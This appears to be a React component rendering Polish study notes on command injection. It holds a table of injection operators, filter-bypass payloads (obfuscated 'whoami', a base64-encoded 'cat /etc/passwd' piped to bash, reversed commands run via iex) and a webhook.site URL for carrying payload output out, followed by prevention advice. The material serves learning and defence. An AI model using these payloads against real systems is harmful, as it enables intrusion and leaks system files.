import { Link } from 'react-router-dom';

const CommandInjection = () => {

    return(
        <section>
            <h1>Commands Injection</h1>
            <details>
                <summary>Metody wstrzykiwania poleceń</summary>
                <table class="table table-striped text-left">
                    <thead>
                        <tr>
                            <th><strong>Operator wtrysku</strong></th>
                            <th><strong>Znak wstrzyknięcia</strong></th>
                            <th><strong>URL-Encoded</strong></th>
                            <th><strong>Wykonane polecenie</strong></th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td>Semicolon</td>
                            <td><code>;</code></td>
                            <td><code>%3b</code></td>
                            <td>Obydwa</td>
                        </tr>
                        <tr>
                            <td>New Line</td>
                            <td><code>\n</code></td>
                            <td><code>%0a</code></td>
                            <td>Obydwa</td>
                        </tr>
                        <tr>
                            <td>Background</td>
                            <td><code>&amp;</code></td>
                            <td><code>%26</code></td>
                            <td>Obydwa (drugie wyjście jest zwykle pokazywane jako pierwsze)</td>
                        </tr>
                        <tr>
                            <td>Pipe</td>
                            <td><code>|</code></td>
                            <td><code>%7c</code></td>
                            <td>Obydwa (pokazane jest tylko drugie wyjście)</td>
                        </tr>
                        <tr>
                            <td>AND</td>
                            <td><code>&amp;&amp;</code></td>
                            <td><code>%26%26</code></td>
                            <td>Obydwa (tylko jeśli najpierw się uda)</td>
                        </tr>
                        <tr>
                            <td>OR</td>
                            <td><code>||</code></td>
                            <td><code>%7c%7c</code></td>
                            <td>Drugie (tylko w przypadku niepowodzenia za pierwszym razem)</td>
                        </tr>
                        <tr>
                            <td>Sub-Shell</td>
                            <td><code>``</code></td>
                            <td><code>%60%60</code></td>
                            <td>Obydwa (Linux-only)</td>
                        </tr>
                        <tr>
                            <td>Sub-Shell</td>
                            <td><code>$()</code></td>
                            <td><code>%24%28%29</code></td>
                            <td>Obydwa (Linux-only)</td>
                        </tr>
                    </tbody>
                </table>
            </details>

            <hr />
            <details>
                <summary>Rodzaje wstrzyknięć</summary>
                <table class="table table-striped text-left">
                    <thead>
                        <tr>
                        <th><strong>Typ wstrzyknięcia</strong></th>
                        <th><strong>Operator</strong></th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                        <td>SQL Injection</td>
                        <td><code>'</code> <code>,</code> <code>;</code> <code>--</code> <code>/* */</code></td>
                        </tr>
                        <tr>
                        <td>Command Injection</td>
                        <td><code>;</code> <code>&amp;&amp;</code></td>
                        </tr>
                        <tr>
                        <td>LDAP Injection</td>
                        <td><code>*</code> <code>(</code> <code>)</code> <code>&amp;</code> <code>|</code></td>
                        </tr>
                        <tr>
                        <td>XPath Injection</td>
                        <td><code>'</code> <code>or</code> <code>and</code> <code>not</code> <code>substring</code> <code>concat</code> <code>count</code></td>
                        </tr>
                        <tr>
                        <td>OS Command Injection</td>
                        <td><code>;</code> <code>&amp;</code> <code>|</code></td>
                        </tr>
                        <tr>
                        <td>Code Injection</td>
                        <td><code>'</code> <code>;</code> <code>--</code> <code>/* */</code> <code>$()</code> <code>${}</code> <code>#{}</code> <code>%{}</code> <code>^</code></td>
                        </tr>
                        <tr>
                        <td>Directory Traversal/File Path Traversal</td>
                        <td><code>../</code> <code>..\\</code> <code>%00</code></td>
                        </tr>
                        <tr>
                        <td>Object Injection</td>
                        <td><code>;</code> <code>&amp;</code> <code>|</code></td>
                        </tr>
                        <tr>
                        <td>XQuery Injection</td>
                        <td><code>'</code> <code>;</code> <code>--</code> <code>/* */</code></td>
                        </tr>
                        <tr>
                        <td>Shellcode Injection</td>
                        <td><code>\x</code> <code>\u</code> <code>%u</code> <code>%n</code></td>
                        </tr>
                        <tr>
                        <td>Header Injection</td>
                        <td><code>\n</code> <code>\r\n</code> <code>\t</code> <code>%0d</code> <code>%0a</code> <code>%09</code></td>
                        </tr>
                    </tbody>
                </table>
            </details>

            <hr />
            <details>
                <summary>Ominięcie zabezpieczeń</summary>
                <table>
                    <thead>
                        <tr>
                            <th><strong>Rodzaj ominięcią</strong></th>
                            <th><strong>Znak wstrzyknięcia</strong></th>
                            <th><strong>Przykład</strong></th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td>Tab</td>
                            <td><code>%09</code></td>
                            <td><code>127.0.0.1%0a%09</code></td>
                        </tr>
                        <tr>
                            <td>$IFS</td>
                            <td><code>{'${IFS}'}</code></td>
                            <td><code>127.0.0.1%0a{'${IFS}'}</code></td>
                        </tr>
                        <tr>
                            <td>Rozwijane nawiasy</td>
                            <td><code>{'{ls,-la}'}</code></td>
                            <td><code>127.0.0.1%0a{'{ls,-la}'}</code></td>
                        </tr>
                        <tr>
                            <td>Zmienne środowiskowe Linux</td>
                            <td><code>{'${PATH}'}</code></td>
                            <td><code>echo {'${PATH}'} -{'>'} / lub echo {'${LS_COLORS:10:1}'} -{'>'} ;</code></td>
                        </tr>
                        <tr>
                            <td>Zmienne środowiskowe Windows</td>
                            <td><code>%HOMEPATH%</code></td>
                            <td><code>echo %HOMEPATH:~6,-11% -{'>'} / </code></td>
                        </tr>
                        <tr>
                            <td>Zmienne środowiskowe Windows - PS</td>
                            <td><code>$env</code></td>
                            <td><code>$env:HOMEPATH{`[0]`} -{'>'} / </code></td>
                        </tr>
                        <tr>
                            <td>Zmiana postaci - Character Shifting</td>
                            <td><code>man ascii     # \ is on 92, before it is {`[`} on 91</code></td>
                            <td><code>{`echo $(tr '!-}' '"-~'<<<[)`} -{'>'} /</code></td>
                        </tr>
                        <tr>
                            <td>Pojedyńcze lub podwójne cudzysłów</td>
                            <td><code>', "</code></td>
                            <td><code>w'h'o'am'i lub w"h"o"am"i</code></td>
                        </tr>
                        <tr>
                            <td>Ukośniki w komendzie - tylko linux</td>
                            <td><code>\</code></td>
                            <td><code>w\ho\am\i</code></td>
                        </tr>
                        <tr>
                            <td>Kareta w komendzie - tylko windows</td>
                            <td><code>^</code></td>
                            <td><code>who^ami</code></td>
                        </tr>
                        <tr>
                            <td>Manipulacja wielkością liter</td>
                            <td><code></code></td>
                            <td><code>WhOaMi lub {`$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")`} lub {'$(a="WhOaMi";printf %s "${a,,}")'}</code></td>
                        </tr>
                        <tr>
                            <td>Odwrócona komenda - linux</td>
                            <td><code></code></td>
                            <td><code>echo 'whoami' | rev -{'>'} {`$(rev<<<'imaohw')`}</code></td>
                        </tr>
                        <tr>
                            <td>Odwrócona komenda - windows PS</td>
                            <td><code></code></td>
                            <td><code>"whoami"[-1..-20] -join '' -{'>'} {`iex "$('imaohw'[-1..-20] -join '')"`}</code></td>
                        </tr>
                        <tr>
                            <td>Szyfrowanie base64 - linux</td>
                            <td><code></code></td>
                            <td><code>echo -n 'cat /etc/passwd | grep 33' | base64 -{'>'} {`bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)`}</code></td>
                        </tr>
                        <tr>
                            <td>Szyfrowanie base64 - windows</td>
                            <td><code></code></td>
                            <td><code>{`[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))`}</code></td>
                        </tr>

                    </tbody>
                </table>
            </details>

            <hr />
            <details>
                <summary>Wklejanie komend w url</summary>
                <p>W input podajemy url np:</p>
                <p className='important'>https://webhook.site/9e65995-448x-435d/?q={'`<Payload>`'}</p>
            </details>  

            <hr />
            <details>
                <summary className='defense'>Zapobieganie Commands Injection</summary>
                <ul>
                    <li className='defense'>
                        Input Validation
                        <br />
                        Sprawdzanie poprawności danych wejściowych powinno odbywać się zarówno po stronie frontend, jak i backend. W PHP, podobnie jak w wielu innych językach tworzenia stron internetowych, wbudowane są filtry dla różnych standardowych formatów, takich jak e-maile, adresy URL, a nawet adresy IP, których można używać z funkcją filter_var
                        Jeśli chcielibyśmy sprawdzić inny niestandardowy format, możemy użyć wyrażenia regularnego z funkcją preg_match. To samo można osiągnąć za pomocą JavaScript zarówno dla front-endu, jak i backendu. Podobnie jak PHP, w NodeJS, możemy również używać bibliotek do sprawdzania poprawności różnych standardowych formatów, jak na przykład is-ip, który możemy zainstalować za pomocą npm, a następnie użyć funkcji isIp(ip) w naszym kodzie. Możesz przeczytać podręczniki innych języków, np. .NET lub Java, aby dowiedzieć się, jak sprawdzić poprawność danych wprowadzanych przez użytkownika w każdym odpowiednim języku.
                    </li>
                    <li className='defense'>
                    Input Sanitization
                    <br />
                    Możemy użyć preg_replace, aby usunąć wszelkie znaki specjalne z danych wprowadzonych przez użytkownika.
                    </li>
                    <li className='defense'>
                        Server Configuration
                        <br />
                        Na koniec powinniśmy upewnić się, że nasz serwer zaplecza jest bezpiecznie skonfigurowany, aby zmniejszyć wpływ w przypadku naruszenia bezpieczeństwa serwera WWW. Niektóre konfiguracje, które możemy wdrożyć, to:
                        <ol className='defense'>
                            <li>Użyj wbudowanej zapory aplikacji internetowej serwera WWW (np. w Apache mod_security) oprócz zewnętrznego WAF (np. Cloudflare, Fortinet, Imperva..)</li>
                            <li>Przestrzegaj zasady najniższych uprawnień (PoLP), uruchamiając serwer WWW jako użytkownik o niskich uprawnieniach (np. www-data)</li>
                            <li>Zapobiegaj wykonywaniu niektórych funkcji przez serwer WWW (np. w PHP Disable_functions=system,...)</li>
                            <li>Ogranicz zakres dostępny dla aplikacji internetowej do jej folderu (np. w PHP open_basedir = '/var/www/html')</li>
                            <li>Odrzucaj podwójnie zakodowane żądania i znaki spoza zestawu ASCII w adresach URL</li>
                            <li>Unikaj używania wrażliwych/nieaktualnych bibliotek i modułów (np. PHP CGI)</li>
                        </ol>
                    </li>
                </ul>
            </details>
        </section>
    )
};

export default CommandInjection;